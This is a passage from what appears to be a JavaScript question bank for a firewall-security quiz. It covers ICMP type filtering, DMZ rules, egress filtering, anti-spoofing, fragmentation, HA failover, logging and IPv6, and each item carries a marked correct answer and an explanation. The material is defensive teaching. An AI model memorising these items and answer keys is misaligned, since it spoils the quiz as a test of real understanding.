                { value: 'type_filter', text: 'DENY ICMP type 8, ALLOW ICMP type 3' },
                { value: 'block_all', text: 'Block all ICMP' },
                { value: 'allow_all', text: 'Allow all ICMP for proper network function' },
                { value: 'rate_limit', text: 'Rate limit ICMP only' },
                { value: 'inbound_only', text: 'Block inbound ICMP, allow outbound' }
            ],
            correct: 'type_filter',
            explanation: '🏓 ICMP Type Filtering: Type 8 = Echo Request (ping), Type 0 = Echo Reply, Type 3 = Destination Unreachable (critical for Path MTU Discovery), Type 11 = Time Exceeded (traceroute). Blocking all ICMP breaks PMTUD → black hole connections. Allow types 3, 11 outbound. Block type 8 inbound (recon prevention). RFC 4890 recommends allowing certain ICMP types. Tools: tcpdump, Wireshark for ICMP analysis.'
        },
        {
            id: 'fw7',
            title: 'DMZ Architecture',
            points: 10,
            question: 'Web server in DMZ (10.50.0.10) needs database access in internal zone (10.10.0.50:3306). Which rule design is MOST secure?',
            type: 'radio',
            options: [
                { value: 'specific_db', text: 'ALLOW DMZ 10.50.0.10 → Internal 10.10.0.50:3306/TCP ONLY' },
                { value: 'subnet', text: 'ALLOW DMZ 10.50.0.0/24 → Internal 10.10.0.0/16 ANY' },
                { value: 'any_internal', text: 'ALLOW DMZ ANY → Internal ANY port 3306/TCP' },
                { value: 'bidirectional', text: 'ALLOW bidirectional ANY between DMZ and Internal' },
                { value: 'deny', text: 'DENY all DMZ to Internal' }
            ],
            correct: 'specific_db',
            explanation: '🏰 DMZ Best Practices: Least privilege = specific source IP + specific destination IP + specific port. DMZ compromise should not pivot to entire internal network. Also implement: 1) Application proxy between zones, 2) Database service account (not sa/root), 3) Network segmentation, 4) IPS between zones, 5) Logging all DMZ→Internal connections. Three-legged firewall model: Outside | DMZ | Inside.'
        },
        {
            id: 'fw8',
            title: 'Egress Filtering Importance',
            points: 8,
            question: 'Why should organizations implement egress (outbound) filtering even with strong ingress controls?',
            type: 'checkbox',
            options: [
                { value: 'exfil', text: 'Prevents data exfiltration from compromised systems' },
                { value: 'c2', text: 'Blocks command & control beaconing' },
                { value: 'lateral', text: 'Limits lateral movement between internal systems' },
                { value: 'ddos', text: 'Prevents internal systems from DDoS participation' },
                { value: 'ingress_sufficient', text: 'Ingress filtering alone is sufficient' },
                { value: 'performance', text: 'Egress filtering improves network performance' }
            ],
            correct: ['exfil', 'c2', 'lateral', 'ddos'],
            explanation: '🚪 Defense in Depth: Assume breach mentality = even with strong perimeter, insider threat or malware gets in. Egress filtering: 1) Block C2 (only allow known-good domains), 2) Stop data exfiltration (limit outbound HTTPS to business sites), 3) Prevent internal scanning (workstation→workstation firewall rules), 4) Block botnet participation. Example rules: Block port 25/TCP outbound (mail relay hijacking), allow only via approved mail server. Tools: DNS filtering, proxy logs.'
        },
        {
            id: 'fw9',
            title: 'Application Layer Filtering',
            points: 9,
            question: 'NGFW rule allows 443/TCP to destination IP. User accesses SSH-over-HTTPS tunnel. What happens with App-ID enabled?',
            type: 'radio',
            options: [
                { value: 'app_blocks', text: 'NGFW detects SSH application inside HTTPS and blocks' },
                { value: 'port_allows', text: 'Allowed' },
                { value: 'inspect_fail', text: 'Inspection fails' },
                { value: 'log_only', text: 'Logged but allowed through' },
                { value: 'redirect', text: 'Redirected to proxy for deeper inspection' }
            ],
            correct: 'app_blocks',
            explanation: '🔬 Next-Gen Firewall (NGFW) App-ID: Unlike traditional port-based firewalls, NGFWs identify applications regardless of port/protocol. Palo Alto App-ID, Fortinet Application Control, Cisco FirePOWER use signatures/heuristics/behavioral analysis. SSH tunnel over 443 = detected as "ssh-tunnel" app. Rules based on app not port: ALLOW app=web-browsing, DENY app=bittorrent. Defeats port-hopping. Also detects: teamviewer, tor, dns-tunneling. Limitations: Encrypted traffic (need SSL inspection).'
        },
        {
            id: 'fw10',
            title: 'GeoIP Blocking',
            points: 6,
            question: 'Company operates only in USA. Admin implements rule: DENY source countries [CN, RU, KP]. What is the limitation?',
            type: 'checkbox',
            options: [
                { value: 'vpn_bypass', text: 'Attackers can use VPNs/proxies to appear from allowed countries' },
                { value: 'inaccurate', text: 'GeoIP databases are not 100% accurate' },
                { value: 'cloud', text: 'Blocks legitimate cloud services with IPs in those countries' },
                { value: 'ipv6', text: 'IPv6 GeoIP data is less accurate than IPv4' },
                { value: 'perfect', text: 'No limitations' }
            ],
            correct: ['vpn_bypass', 'inaccurate', 'cloud', 'ipv6'],
            explanation: '🌍 GeoIP Limitations: 1) VPN/proxy bypass ($5/month VPN = US IP), 2) Database accuracy ~95-98% (IP blocks reassigned, mobile IPs), 3) CDNs/cloud (Cloudflare/AWS IPs may geolocate differently), 4) IPv6 geolocation less mature. Defense in depth: GeoIP + threat intel + behavior analysis. Legitimate uses: Reduce attack surface, compliance (data residency), fraud prevention. Tools: MaxMind GeoIP2, IP2Location. Not a silver bullet.'
        },
        {
            id: 'fw11',
            title: 'High Availability Failover',
            points: 7,
            question: 'Active/Standby firewall pair with stateful failover. Active firewall fails during 50,000 active connections. What happens?',
            type: 'radio',
            options: [
                { value: 'stateful_preserved', text: 'Standby becomes active, preserves connection state' },
                { value: 'all_reset', text: 'All 50,000 connections reset' },
                { value: 'half_preserved', text: 'Only TCP connections preserved' },
                { value: 'manual', text: 'Requires manual failover initiation' },
                { value: 'no_failover', text: 'Standby remains passive' }
            ],
            correct: 'stateful_preserved',
            explanation: '🔄 Stateful HA: Active firewall continuously syncs connection table to standby via dedicated link (usually direct fiber). Upon failure: Standby assumes active role, inherits MAC/IP (gratuitous ARP), maintains all connection states. Sub-second failover for stateful HA. Active/Active = both process traffic (higher throughput). Protocols: VRRP, CARP. Vendors: Cisco ASA (failover link), Palo Alto (HA1/HA2), pfSense (CARP+pfsync). Test regularly!'
        },
        {
            id: 'fw12',
            title: 'Firewall Logging Best Practices',
            points: 8,
            question: 'What should be logged for security monitoring? (Select ALL appropriate)',
            type: 'checkbox',
            options: [
                { value: 'denied', text: 'Denied connection attempts' },
                { value: 'allowed_sensitive', text: 'Allowed connections to sensitive resources' },
                { value: 'changes', text: 'Firewall rule changes' },
                { value: 'all_allowed', text: 'Every allowed connection' },
                { value: 'bandwidth', text: 'Bandwidth usage per rule' },
                { value: 'failover', text: 'HA failover events' }
            ],
            correct: ['denied', 'allowed_sensitive', 'changes', 'failover'],
            explanation: '📊 Firewall Logging Strategy: 1) LOG all DENY (reconnaissance, attack attempts), 2) LOG allowed traffic to crown jewels (database, domain controllers), 3) LOG config changes (admin accountability), 4) LOG failover events. AVOID: Logging ALL allowed traffic (storage explosion, SIEM overload). Use sampling or NetFlow for bandwidth analysis. Send logs to SIEM (Splunk, Sentinel, ELK). Retention: 90 days minimum (compliance). Include: timestamp, src/dst IP, port, action, rule ID, bytes.'
        },
        {
            id: 'fw13',
            title: 'Rule Optimization',
            points: 9,
            question: 'Firewall has 500 rules. Rule #487 matches 40% of all traffic. What should you do?',
            type: 'radio',
            options: [
                { value: 'move_top', text: 'Move rule #487 higher' },
                { value: 'keep_bottom', text: 'Keep at bottom' },
                { value: 'delete', text: 'Delete rule' },
                { value: 'log_only', text: 'Change to log-only mode' },
                { value: 'split', text: 'Split into multiple more specific rules' }
            ],
            correct: 'move_top',
            explanation: '⚡ Rule Optimization: Firewalls process rules sequentially top-to-bottom. Rule 487 means every packet checks 486 rules first before match. 40% traffic = huge performance waste. Move frequently-matched rules higher. Tools: Firewall hit counters (show rule usage), packet captures, firewall analyzer. Also: Remove unused rules (0 hits), consolidate overlapping rules, use rule groups. Annual rule review. High-traffic rules = business-critical apps (DNS, AD, web).'
        },
        {
            id: 'fw14',
            title: 'Microsegmentation',
            points: 10,
            question: 'Organization implements microsegmentation. What is the primary benefit?',
            type: 'radio',
            options: [
                { value: 'lateral_prevention', text: 'Prevents lateral movement' },
                { value: 'faster', text: 'Increases network performance' },
                { value: 'cheaper', text: 'Reduces firewall hardware costs' },
                { value: 'ddos', text: 'Protects against DDoS attacks' },
                { value: 'compliance', text: 'Automatically ensures compliance' }
            ],
            correct: 'lateral_prevention',
            explanation: '🔒 Microsegmentation (Zero Trust): Traditional firewall = perimeter only (castle-and-moat). Microsegmentation = firewall everywhere (workload-to-workload). Example: Web tier can\'t talk to database tier except specific app server. VMware NSX, Illumio, Cisco ACI implement host-based firewall policies. Prevents: Ransomware spread, lateral movement after initial compromise. Requires: Asset inventory, traffic flow mapping (observation mode first), policy enforcement. Challenge: Complex rule management.'
        },
        {
            id: 'fw15',
            title: 'URL Filtering Categories',
            points: 7,
            question: 'NGFW blocks access to "Newly Registered Domains" category. Why is this security-relevant?',
            type: 'radio',
            options: [
                { value: 'phishing', text: 'Phishing/malware campaigns often use newly registered domains' },
                { value: 'bandwidth', text: 'New domains consume excessive bandwidth' },
                { value: 'slow', text: 'New domains have slower response times' },
                { value: 'illegal', text: 'New domain registration is illegal' },
                { value: 'productivity', text: 'Only productivity concern' }
            ],
            correct: 'phishing',
            explanation: '🎣 Newly Registered Domains (NRD): Attackers register domains hours before phishing campaigns (avoid reputation blacklists). Example: amazon-verify-account-2024.com (registered today). URL filtering vendors (Palo Alto, Zscaler, Cisco Umbrella) categorize domains by age, category, risk score. Also block: Parked domains, Dynamic DNS, TLDs (.tk, .ml, .ga = free domains). Combine with: Email gateway filtering, user training. Legitimate new sites = whitelist exceptions. Threat intel integration.'
        },
        {
            id: 'fw16',
            title: 'Anti-Spoofing (RPF)',
            points: 8,
            question: 'Firewall interface facing ISP receives packet: Source IP 10.1.1.50 (internal RFC1918 IP). What should happen with anti-spoofing enabled?',
            type: 'radio',
            options: [
                { value: 'drop_spoof', text: 'Dropped' },
                { value: 'allow', text: 'Allowed through normally' },
                { value: 'nat', text: 'Automatically NAT\'d to public IP' },
                { value: 'log_only', text: 'Logged but allowed' },
                { value: 'icmp', text: 'Respond with ICMP error' }
            ],
            correct: 'drop_spoof',
            explanation: '🎭 Anti-Spoofing (Reverse Path Forwarding): Firewall verifies packet source IP matches expected interface. External interface = public IPs only, internal interface = internal IPs only. Spoofed RFC1918 from Internet = attack (DDoS amplification, IP hijacking). Strict RPF: Check routing table (would reply go out same interface?). Loose RPF: Just verify route exists. BCP 38 (RFC 2827) recommends anti-spoofing at ISP edge. Cisco: "ip verify unicast source reachable-via". Blocks: Smurf attacks, DRDoS.'
        },
        {
            id: 'fw17',
            title: 'Firewall Bypass via Fragmentation',
            points: 9,
            question: 'Attacker sends fragmented packets where first fragment contains TCP header but port number split across fragments. How should firewall handle this?',
            type: 'radio',
            options: [
                { value: 'reassemble', text: 'Reassemble fragments before inspection' },
                { value: 'first_only', text: 'Inspect first fragment only' },
                { value: 'allow_all', text: 'Allow all fragments' },
                { value: 'block_all', text: 'Block all fragmented packets' },
                { value: 'forward', text: 'Forward to destination for reassembly' }
            ],
            correct: 'reassemble',
            explanation: '🧩 Fragmentation Attacks: Attackers split packets to evade inspection. Firewall sees fragment 1 (TCP port incomplete) + fragment 2 (port bytes) = can\'t make policy decision. Defense: Virtual reassembly (buffer fragments, inspect complete packet, forward). Attacks: Teardrop (overlapping fragments), Tiny fragments (fragment offset manipulation). Modern firewalls perform stateful reassembly. Drop: Overlapping fragments, fragments smaller than minimum size, excessive fragment timeout. RFC 8900.'
        },
        {
            id: 'fw18',
            title: 'Time-Based Rules',
            points: 6,
            question: 'When are time-based firewall rules most beneficial?',
            type: 'checkbox',
            options: [
                { value: 'maintenance', text: 'Allow vendor access only during maintenance windows' },
                { value: 'offhours', text: 'Block unusual outbound traffic during off-business hours' },
                { value: 'temp_access', text: 'Temporary contractor/partner access' },
                { value: 'performance', text: 'Improve firewall performance during peak hours' },
                { value: 'cost', text: 'Reduce licensing costs' }
            ],
            correct: ['maintenance', 'offhours', 'temp_access'],
            explanation: '⏰ Time-Based ACLs: Schedule-based rules for defense in depth. Examples: 1) Allow third-party vendor 203.0.113.50 → Internal RDP only Mon-Fri 9AM-5PM, 2) Block workstation→workstation SMB during nights/weekends (ransomware detection), 3) Temporary access auto-expires (contractor done = rule auto-disabled). Vendors: Cisco (time-range), Palo Alto (schedule), pfSense (schedules). Use cases: Reduce attack surface, compliance, change management, anomaly detection. NTP sync critical!'
        },
        {
            id: 'fw19',
            title: 'Firewall Rule Documentation',
            points: 5,
            question: 'Why is documenting firewall rules (description field, change tickets) critical?',
            type: 'checkbox',
            options: [
                { value: 'audit', text: 'Compliance audits require justification for rules' },
                { value: 'troubleshoot', text: 'Troubleshooting' },
                { value: 'cleanup', text: 'Identify obsolete rules for removal' },
                { value: 'knowledge', text: 'Knowledge transfer when admins change' },
                { value: 'performance', text: 'Improves firewall processing speed' },
                { value: 'security', text: 'Documentation alone prevents attacks' }
            ],
            correct: ['audit', 'troubleshoot', 'cleanup', 'knowledge'],
            explanation: '📝 Rule Documentation Best Practices: Every rule should have: 1) Description (why it exists), 2) Ticket # (change request), 3) Business owner, 4) Review date. Example: "Rule #42: Allow 10.10.5.0/24 → SQL01:1433/TCP | Ticket: CHG00012345 | Owner: Finance App Team | Expires: 2025-12-31". Prevents: Unknown rules (fear of breaking things = never deleted), shadow IT, compliance failures. Annual review: Contact owner, verify still needed. Tool: Firewall auditing software (Tufin, AlgoSec).'
        },
        {
            id: 'fw20',
            title: 'Firewall vs IPS Placement',
            points: 8,
            question: 'Organization has both firewall and IPS. What is the recommended placement?',
            type: 'radio',
            options: [
                { value: 'firewall_first', text: 'Firewall first, then IPS' },
                { value: 'ips_first', text: 'IPS first, then firewall' },
                { value: 'parallel', text: 'Parallel' },
                { value: 'single', text: 'Use only one' },
                { value: 'random', text: 'Load balance between them' }
            ],
            correct: 'firewall_first',
            explanation: '🛡️ Defense in Depth Layering: Internet → Firewall (discard obviously bad) → IPS (deep packet inspection of allowed) → Servers. Firewall = Layer 3/4 filtering (fast, stateful), IPS = Layer 7 analysis (slower, signatures/anomaly detection). Firewall reduces IPS load (no need to inspect blocked traffic). Modern NGFWs combine both = single device. Additional layers: WAF (after IPS for web apps), EDR (on endpoints). Cisco: ASA (firewall) + FirePOWER (IPS). Palo Alto: Unified threat prevention.'
        },
        {
            id: 'fw21',
            title: 'Connection Tracking',
            points: 6,
            question: 'Firewall shows connection state as "ESTABLISHED". What does this mean?',
            type: 'radio',
            options: [
                { value: 'handshake_complete', text: 'TCP 3-way handshake completed, data transfer occurring' },
                { value: 'new_connection', text: 'New connection attempt' },
                { value: 'closing', text: 'Connection closing' },
                { value: 'udp_state', text: 'UDP connection established' },
                { value: 'blocked', text: 'Connection blocked by firewall' }
            ],
            correct: 'handshake_complete',
            explanation: '🔗 Connection States: **NEW** = First packet (SYN), **ESTABLISHED** = Handshake complete (SYN, SYN-ACK, ACK done), bidirectional traffic. **RELATED** = New connection related to existing (FTP data channel). **INVALID** = Doesn\'t match any known connection. **CLOSING** = FIN or RST seen. UDP = pseudo-stateful (timeout-based). iptables: -m state --state ESTABLISHED,RELATED. Security: Only allow NEW from trusted sources, ESTABLISHED inbound = responses to outbound requests. Monitor INVALID states (attacks, misconfigurations).'
        },
        {
            id: 'fw22',
            title: 'Default Deny Policy',
            points: 5,
            question: 'What is the security principle behind "default deny" firewall policy?',
            type: 'radio',
            options: [
                { value: 'whitelist', text: 'Block everything except explicitly allowed traffic' },
                { value: 'blacklist', text: 'Allow everything except explicitly blocked traffic' },
                { value: 'performance', text: 'Improves firewall performance' },
                { value: 'logging', text: 'Reduces log volume' },
                { value: 'balanced', text: 'Balance between security and usability' }
            ],
            correct: 'whitelist',
            explanation: '🛡️ Default Deny = Zero Trust principle. Start with "DENY ALL", explicitly ALLOW needed services. vs Default Allow (blacklist bad = always incomplete, new attacks bypass). Example: Last rule "DENY ANY ANY" (implicit in most FWs). Benefits: Secure by default, prevents shadow IT, forces documentation of business needs. Drawback: Requires understanding traffic patterns (too restrictive = business impact). Implementation: Observe mode first (log, don\'t block), identify legitimate traffic, create rules, enforce. NIST 800-41 recommends default deny.'
        },
        {
            id: 'fw23',
            title: 'Outbound Filtering Strategy',
            points: 7,
            question: 'Why filter outbound traffic from servers? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'c2_block', text: 'Block command & control communications' },
                { value: 'data_exfil', text: 'Prevent data exfiltration' },
                { value: 'botnet', text: 'Stop compromised servers from joining botnets' },
                { value: 'scan_prevent', text: 'Prevent server from scanning/attacking others' },
                { value: 'unnecessary', text: 'Servers never need outbound access' },
                { value: 'bandwidth', text: 'Save bandwidth costs' }
            ],
            correct: ['c2_block', 'data_exfil', 'botnet', 'scan_prevent'],
            explanation: '🚪 Egress Filtering: Assume breach = compromised server should not freely communicate outbound. Allow only: Updates (specific URLs), time sync (NTP), logging (syslog), DNS. Block: Direct internet browsing, IRC, unusual ports, non-business domains. Example: Web server needs outbound 443 to payment processor ONLY (not entire internet). Detection: Server initiating RDP/SSH outbound = lateral movement, DNS to DGA domains = malware. Tools: Proxy with whitelist, firewall rules, DNS filtering. Defense in depth = critical.'
        },
        {
            id: 'fw24',
            title: 'Zone-Based Firewall',
            points: 6,
            question: 'In zone-based firewall model, which traffic flow requires a rule?',
            type: 'radio',
            options: [
                { value: 'inter_zone', text: 'Traffic between different zones' },
                { value: 'intra_zone', text: 'Traffic within same zone' },
                { value: 'both', text: 'Both inter-zone and intra-zone' },
                { value: 'none', text: 'No rules needed' },
                { value: 'outbound_only', text: 'Only outbound traffic' }
            ],
            correct: 'inter_zone',
            explanation: '🗺️ Zone-Based Policy: Interfaces assigned to zones (Internet, DMZ, Internal, Management). Rules control traffic BETWEEN zones. **Intra-zone** = typically allowed (same trust level). **Inter-zone** = default deny, explicit rules required. Example: Internet→DMZ (allow 80/443), DMZ→Internal (deny all), Internal→Internet (allow via proxy). Benefits: Scalable (add interface to zone vs per-interface rules), conceptual simplicity. Cisco ZBF, Palo Alto Security Zones. Zone model = modern firewall architecture.'
        },
        {
            id: 'fw25',
            title: 'Asymmetric Routing Issues',
            points: 7,
            question: 'Stateful firewall drops packets. Investigation shows: Outbound via FW1, return via FW2. What is the issue?',
            type: 'radio',
            options: [
                { value: 'asymmetric', text: 'Asymmetric routing' },
                { value: 'misconfiguration', text: 'Firewall rule misconfiguration' },
                { value: 'attack', text: 'Active routing attack' },
                { value: 'normal', text: 'Normal behavior' },
                { value: 'load_balancing', text: 'Load balancing feature' }
            ],
            correct: 'asymmetric',
            explanation: '🔄 Asymmetric Routing Problem: Stateful firewall tracks connections (SYN out FW1 → expects return via FW1). Return via FW2 = no state entry = DROP. Causes: Multiple ISPs, ECMP, complex routing. Solutions: 1) **Symmetric routing** (route manipulation), 2) **State sync** between FW1/FW2 (cluster), 3) **Stateless ACLs** (not stateful inspection), 4) **PBR** (policy-based routing). Cloud environments prone (AWS multiple routes). Symptoms: Random drops, works sometimes, traceroute confusion. Diagnose: Capture on both FWs, compare flows.'
        },
        {
            id: 'fw26',
            title: 'Connection Timeout Values',
            points: 6,
            question: 'Why do firewalls have different timeout values for TCP ESTABLISHED (3600s) vs UDP (30s)?',
            type: 'radio',
            options: [
                { value: 'stateful_vs_stateless', text: 'TCP is connection-oriented, UDP is connectionless' },
                { value: 'tcp_faster', text: 'TCP connections are faster' },
                { value: 'udp_insecure', text: 'UDP is less secure' },
                { value: 'arbitrary', text: 'Arbitrary vendor choice' },
                { value: 'tcp_encrypted', text: 'TCP supports encryption, UDP doesn\'t' }
            ],
            correct: 'stateful_vs_stateless',
            explanation: '⏱️ Connection Timeouts: **TCP** = stateful (FIN/RST closes), long timeout OK (web browsing, SSH). **UDP** = no connection concept, short timeout prevents state table exhaustion. **ICMP** = very short (few seconds). Typical: TCP ESTABLISHED = 1hr, UDP = 30s-5min, TCP half-open = 30s. Attack: UDP flood fills state table → DoS. Tuning: VoIP/gaming = longer UDP timeout, high-traffic servers = shorter timeouts. Monitor: State table utilization (>80% = problem). Commands: show conn (ASA), conntrack -L (Linux).'
        },
        {
            id: 'fw27',
            title: 'Firewall Throughput vs Latency',
            points: 6,
            question: 'Firewall specs show: 10 Gbps throughput, 5ms latency. What do these metrics mean?',
            type: 'radio',
            options: [
                { value: 'correct', text: 'Throughput = max bandwidth capacity, Latency = delay added by inspection' },
                { value: 'same', text: 'Both measure the same thing' },
                { value: 'throughput_latency', text: 'Throughput measures latency in Gbps' },
                { value: 'latency_bandwidth', text: 'Latency measures bandwidth in milliseconds' },
                { value: 'marketing', text: 'Marketing terms with no technical meaning' }
            ],
            correct: 'correct',
            explanation: '📊 Firewall Performance Metrics: **Throughput** = Data volume per second (Gbps), max capacity (like highway lanes). **Latency** = Delay firewall adds (ms), inspection time (like speed limit). **Connections/sec** = New connection rate. **Concurrent connections** = Max state table size. Trade-offs: Deep inspection = higher latency but better security, stateless ACL = low latency but less security. Real-world: Marketing throughput often "ideal conditions" (large packets, minimal features). Test: iperf through FW, measure actual throughput/latency under load with all features enabled.'
        },
        {
            id: 'fw28',
            title: 'Object Groups Usage',
            points: 5,
            question: 'Why use object groups (network/service groups) instead of individual IPs/ports in firewall rules?',
            type: 'checkbox',
            options: [
                { value: 'maintainability', text: 'Easier maintenance' },
                { value: 'readability', text: 'Improved rule readability' },
                { value: 'performance', text: 'Better firewall performance' },
                { value: 'reusability', text: 'Reusability across multiple rules' },
                { value: 'security', text: 'Groups provide encryption' },
                { value: 'mandatory', text: 'Required by firewall' }
            ],
            correct: ['maintainability', 'readability', 'reusability'],
            explanation: '📦 Object Groups: Abstraction for manageability. **Network group** "WEB_SERVERS" = {10.1.1.10, 10.1.1.11, 10.1.1.12}. **Service group** "WEB" = {TCP/80, TCP/443}. Add new web server? Update group once (not 50 rules). Benefits: Consistency, documentation (meaningful names), change control. NOT: Performance (minimal impact), encryption (unrelated), required (can use IPs directly but painful). Vendors: Cisco object-groups, Palo Alto address/service objects, pfSense aliases. Best practice: Use groups for everything (even single IP = future-proof).'
        },
        {
            id: 'fw29',
            title: 'Active FTP vs Passive FTP Firewall',
            points: 8,
            question: 'FTP Active mode fails through firewall but Passive mode works. Why?',
            type: 'radio',
            options: [
                { value: 'active_inbound', text: 'Active FTP requires server→client connection, Passive uses client→server' },
                { value: 'port_diff', text: 'Active uses port 21, Passive uses port 20' },
                { value: 'passive_encrypted', text: 'Passive FTP is encrypted, Active is not' },
                { value: 'active_faster', text: 'Active FTP is faster' },
                { value: 'no_diff', text: 'No difference' }
            ],
            correct: 'active_inbound',
            explanation: '📁 FTP Firewall Challenge: **Active FTP**: Client opens port, server connects back (PORT command) → requires inbound allow = firewall blocks. **Passive FTP**: Client initiates both control + data connections (PASV command) → only outbound = works. Port 21 = control (both modes), Port 20 = data (active), High ports = data (passive). Solution: FTP application layer gateway (ALG) inspects control channel, dynamically allows data connections. Disable ALG if issues. Modern: Use SFTP (SSH File Transfer) or FTPS (FTP over TLS) instead. Legacy FTP = firewall/NAT nightmare.'
        },
        {
            id: 'fw30',
            title: 'Firewall Rule Hit Counter',
            points: 5,
            question: 'Rule #45 shows 0 hits after 6 months. What should you do?',
            type: 'radio',
            options: [
                { value: 'review_remove', text: 'Review and likely remove' },
                { value: 'keep', text: 'Keep' },
                { value: 'move_top', text: 'Move to top for better visibility' },
                { value: 'increase_priority', text: 'Increase rule priority' },
                { value: 'ignore', text: 'Ignore' }
            ],
            correct: 'review_remove',
            explanation: '🧹 Firewall Rule Hygiene: 0 hits = 1) Service decommissioned (rule obsolete), 2) Shadow IT (nobody using approved path), 3) Blocked by earlier rule, 4) Emergency rule forgotten. Action: **Contact rule owner** (ticket number, business owner), verify still needed, remove if not. Benefits: Reduce complexity, faster rule processing, easier audits, security (unused rules = forgotten context = risk). Annual cleanup: Rules unused >12 months = candidates for removal. Document: Change request before deletion (revert if needed). Tools: Firewall analyzers (Tufin, AlgoSec) flag unused rules.'
        },
        {
            id: 'fw31',
            title: 'Logging Level Selection',
            points: 6,
            question: 'Which firewall events should be logged for security monitoring? (Select ALL recommended)',
            type: 'checkbox',
            options: [
                { value: 'denied', text: 'Denied connection attempts' },
                { value: 'admin_changes', text: 'Administrative changes' },
                { value: 'policy_violations', text: 'Policy violations' },
                { value: 'all_allowed', text: 'Every allowed connection' },
                { value: 'denied_invalid', text: 'Denied+INVALID state packets' },
                { value: 'nothing', text: 'Minimal logging' }
            ],
            correct: ['denied', 'admin_changes', 'policy_violations', 'denied_invalid'],
            explanation: '📝 Firewall Logging Strategy: **Must log**: DENY events (reconnaissance, attacks), admin changes (audit trail), policy violations (C2 attempts), INVALID packets (spoofing, attacks). **Don\'t log**: Every allowed connection (storage explosion, SIEM overload, compliance issues - GDPR/privacy). Use NetFlow/sampling for traffic analysis. **INVALID state** = key security indicator (half-open scan, spoofing). Send to SIEM, retain 90+ days (compliance). Rate limiting: Limit logs (1000/sec) prevent log DoS. Structured logs: CEF, Syslog with facility.'
        },
        {
            id: 'fw32',
            title: 'IPv4 vs IPv6 Firewall Rules',
            points: 7,
            question: 'Organization enables IPv6. What is critical for firewall security?',
            type: 'checkbox',
            options: [
                { value: 'ipv6_rules', text: 'Create explicit IPv6 firewall rules (IPv4 rules don\'t apply to IPv6)' },
                { value: 'icmpv6', text: 'Allow necessary ICMPv6' },
                { value: 'ra_guard', text: 'Implement RA Guard' },
                { value: 'disable', text: 'Disable IPv6 entirely if not needed' },
                { value: 'auto', text: 'IPv4 rules automatically protect IPv6' },
                { value: 'no_firewall', text: 'IPv6 doesn\'t need firewall (built-in security)' }
            ],
            correct: ['ipv6_rules', 'icmpv6', 'ra_guard', 'disable'],
            explanation: '🌐 IPv6 Firewall Security: Common mistake = secure IPv4, forget IPv6 (dual-stack bypass). **Requirements**: 1) **Separate IPv6 rules** (different syntax ::/0 not 0.0.0.0/0), 2) **ICMPv6 necessary** (ND, RA, DAD - don\'t block all like ICMPv4), 3) **RA Guard** (prevent rogue router attacks), 4) **Extension headers** (fragment header attacks, routing header). **If not using IPv6**: Explicitly disable (prevent tunneling attacks). Tools: ip6tables, IPv6 firewall policy. Many breaches = forgotten IPv6. RFC 4890 IPv6 filtering recommendations.'
        },
        {
            id: 'fw33',
            title: 'Spoofed Packet Detection',
            points: 6,
            question: 'Internal user (10.1.1.50) sends packet with source IP 8.8.8.8. What should firewall do?',
            type: 'radio',
            options: [
                { value: 'drop_log', text: 'Drop and log' },
                { value: 'allow', text: 'Allow' },
                { value: 'nat_rewrite', text: 'Rewrite source to correct IP via NAT' },
                { value: 'rate_limit', text: 'Rate limit the traffic' },
                { value: 'normal', text: 'Normal traffic' }
            ],
            correct: 'drop_log',
            explanation: '🚨 Egress Spoofing = Red Flag. Internal host should never send packets with external source IP. Indicates: 1) **Malware** (DDoS participation, reflection attacks), 2) **Compromised host** (attacker pivoting), 3) **Misconfiguration** (less likely). Action: **Block immediately**, alert SOC, investigate source host (malware scan, network isolation). BCP 38 = ISPs should drop spoofed packets but don\'t always. Your network responsibility = prevent your hosts from spoofing. iptables example: -s ! 10.0.0.0/8 -i eth0 -j DROP (internal interface must use internal IP).'
        },
        {
            id: 'fw34',
            title: 'Application-Layer Gateway',
            points: 7,
            question: 'Firewall ALG (Application-Layer Gateway) for SIP VoIP causes call failures. What is likely issue?',
            type: 'radio',
            options: [
                { value: 'alg_breaks', text: 'ALG modifying packets incorrectly' },
                { value: 'alg_required', text: 'ALG is required and working correctly' },
                { value: 'bandwidth', text: 'Insufficient bandwidth for VoIP' },
                { value: 'ports', text: 'Wrong ports configured' },
                { value: 'encryption', text: 'VoIP encryption incompatible' }
            ],
            correct: 'alg_breaks',
            explanation: '📞 ALG Problems: ALGs inspect/modify application protocols (FTP, SIP, H.323, TFTP). SIP ALG rewrites IP addresses in SDP (Session Description Protocol). Issues: 1) **Bug in ALG** (incorrect modification), 2) **Encrypted SIP** (TLS - ALG can\'t inspect), 3) **Non-standard implementation** (vendor-specific SIP). Symptoms: One-way audio, call setup fails, NAT traversal broken. Solution: **Disable ALG** (Cisco: no fixup protocol sip), use SIP-aware SBC (Session Border Controller), ALG-free NAT. Modern trend: Disable ALGs, use proper application design (STUN, TURN, ICE).'
        },
        {
            id: 'fw35',
            title: 'Firewall Cluster Active-Active',
            points: 7,
            question: 'Active-Active firewall cluster vs Active-Standby. What is the main benefit of Active-Active?',
            type: 'radio',
            options: [
                { value: 'throughput', text: 'Higher throughput' },
                { value: 'simpler', text: 'Simpler configuration' },
                { value: 'cheaper', text: 'Lower cost' },
                { value: 'security', text: 'Better security posture' },
                { value: 'failover', text: 'Faster failover time' }
            ],
            correct: 'throughput',
            explanation: '⚖️ HA Modes: **Active-Standby** = Primary handles traffic, Secondary idle (100% capacity waste but simple). **Active-Active** = Both process traffic (2x throughput, full utilization). Challenge: Connection persistence (ensure both directions via same FW - asymmetric routing issues). Load balance: Round-robin, source IP hash. **State sync** critical (connection table replicated). Cost: Active-Active = better ROI (no idle hardware). Use case: High-throughput environments (data centers). Vendors: Palo Alto HA, Fortinet cluster, Cisco ASA failover active/active.'
        },
        {
            id: 'fw36',
            title: 'Geo-Blocking Effectiveness',
            points: 6,
            question: 'Firewall blocks all traffic from country X. What are limitations? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'vpn', text: 'Attackers use VPNs/proxies to appear from allowed countries' },
                { value: 'accuracy', text: 'GeoIP databases have accuracy issues' },
                { value: 'cdn', text: 'Legitimate services may have IPs in blocked country' },
                { value: 'travelers', text: 'Blocks legitimate users traveling to that country' },
                { value: 'perfect', text: 'No limitations' },
                { value: 'encryption', text: 'Cannot block encrypted traffic from that country' }
            ],
            correct: ['vpn', 'accuracy', 'cdn', 'travelers'],
